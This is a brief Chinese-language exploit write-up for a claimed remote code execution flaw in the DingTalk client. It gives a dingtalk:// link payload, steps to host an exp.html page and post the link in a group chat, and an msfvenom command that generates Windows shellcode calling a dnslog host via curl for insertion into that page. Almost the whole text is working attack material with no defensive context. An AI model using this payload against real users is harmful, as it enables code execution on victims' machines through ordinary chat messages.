# 钉钉RCE 漏洞

> payload `dingtalk://dingtalkclient/page/link?url=127.0.0.1/exp.html&pc_slide=true`
## 利用方式
1. 启动web 服务`python -m http.server 80` 
2. 发送payload 到钉钉聊天群组中（个人聊天不能触发）

## 其中shellcode 可以通过msfvenom定制

 `msfvenom -a x86 –platform windows -p windows/exec cmd="curl xxx.dnslog.cn" -e x86/alpha_mixed -f csharp`

 将上面生成的内容调换到 exp.html 文件中的 `var shellcode=new Uint8Array([.....])`